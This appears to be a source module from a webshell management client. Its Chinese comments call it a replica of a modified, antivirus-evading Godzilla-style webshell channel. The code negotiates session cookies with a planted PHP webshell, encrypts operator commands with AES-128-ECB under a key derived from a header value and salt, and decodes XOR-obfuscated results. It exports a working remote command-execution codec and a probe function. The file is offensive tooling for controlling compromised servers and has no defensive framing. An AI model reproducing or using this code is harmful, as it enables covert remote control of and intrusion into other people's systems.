// dsh-webshell-mgr 魔改哥斯拉型通道（godzilla-mod）：免杀侧哥斯拉式 payload demo 的
// 客户端复刻。
//   密钥：K = md5(X-G 头值 + SALT)[0:16]（conn.password = X-G 值，conn.secretKey = 盐）
//   通行证：首包 → Set-Cookie PHPSESSID + sid=<16hex>；后续请求须带全套 Cookie
//   请求体 = AES-128-ECB(K, 2 字节协议头 + 命令)（PKCS7）
//   响应 = base64( md5hex(结果)[0:16] 的 ascii + 结果逐字节 XOR K-ascii 循环 )
//   客户端校验 md5 前缀保证完整性。

import { createCipheriv, createDecipheriv } from "node:crypto";
import { httpRequest, b64, unb64, md5hex, cookieHeaderFor, absorbCookies, clearCookies } from "./http-client.js";

const DEFAULT_SALT = "g7#m";
const scopeOf = (conn) => conn.__scope ?? conn.id ?? conn.url;

function keyOf(conn) {
	const salt = conn.secret_key || conn.secretKey || DEFAULT_SALT;
	return md5hex((conn.password ?? "") + salt).slice(0, 16);
}

function ecbEncrypt(key, plaintext) {
	const c = createCipheriv("aes-128-ecb", Buffer.from(key, "utf8"), null);
	return Buffer.concat([c.update(Buffer.from(plaintext, "utf8")), c.final()]);
}

function xorStream(buf, key) {
	const out = Buffer.alloc(buf.length);
	const kb = Buffer.from(key, "utf8");
	for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ kb[i % kb.length];
	return out;
}

/** 首包：拿 PHPSESSID + sid 通行证。 */
async function handshake(conn) {
	const scope = scopeOf(conn);
	const headers = {
		"x-g": conn.password ?? "",
		"content-type": "application/octet-stream",
		...(cookieHeaderFor(scope) ? { cookie: cookieHeaderFor(scope) } : {})
	};
	const res = await httpRequest({ url: conn.url, method: "POST", headers, body: Buffer.from("00"), timeoutMs: conn.timeoutMs });
	absorbCookies(scope, res.headers);
	const cookie = cookieHeaderFor(scope);
	if (!cookie.includes("sid=") || !/PHPSESSID=/i.test(cookie)) throw new Error("通行证协商失败：未下发 sid/PHPSESSID");
}

async function ensureSession(conn) {
	const scope = scopeOf(conn);
	const cookie = cookieHeaderFor(scope);
	if (!cookie || !cookie.includes("sid=")) await handshake(conn);
}

/** 执行命令 → 结果字符串（md5 前缀完整性校验）。 */
export async function runCommand(conn, command) {
	await ensureSession(conn);
	const scope = scopeOf(conn);
	const key = keyOf(conn);
	const body = ecbEncrypt(key, "\x00\x00" + command);
	const res = await httpRequest({
		url: conn.url,
		method: "POST",
		headers: { "x-g": conn.password ?? "", "content-type": "application/octet-stream", cookie: cookieHeaderFor(scope) },
		body,
		timeoutMs: conn.timeoutMs
	});
	if (res.status !== 200) throw new Error(`马侧拒绝（HTTP ${res.status}——通行证失效可重连）`);
	absorbCookies(scope, res.headers);
	const packed = unb64(res.bodyBuffer.toString("utf8").trim());
	if (packed.length <= 16) throw new Error("响应长度异常");
	const head = packed.subarray(0, 16).toString("utf8");
	const result = xorStream(packed.subarray(16), key);
	// PHP md5($r) 按字节哈希——校验头同样按字节 md5 取前 16 hex
	const { createHash } = await import("node:crypto");
	const raw = createHash("md5").update(result).digest("hex").slice(0, 16);
	if (raw !== head) throw new Error("回传校验失败（md5 前缀不符——密钥/盐可能不匹配）");
	return result;
}

const probeToken = () => "WSMP" + Math.random().toString(36).slice(2, 10).toUpperCase();

export async function probe(conn) {
	// 通行证协商态易受瞬时超时影响：失败清 cookie 重试一次
	for (let i = 0; i < 2; i++) {
		try {
			const token = probeToken();
			const raw = await runCommand({ ...conn, timeoutMs: Math.min(conn.timeoutMs, 9000) }, "echo " + token);
			if (raw.toString("utf8").includes(token)) return { tokenOutput: raw.toString("utf8") };
			clearCookies(scopeOf(conn));
		} catch {
			clearCookies(scopeOf(conn));
		}
	}
	return null;
}

export const godzillaModCodec = {
	id: "godzilla-mod",
	label: "魔改哥斯拉型通道",
	langs: ["php"],
	caps: { cmd: true, code: false },
	run: runCommand
};
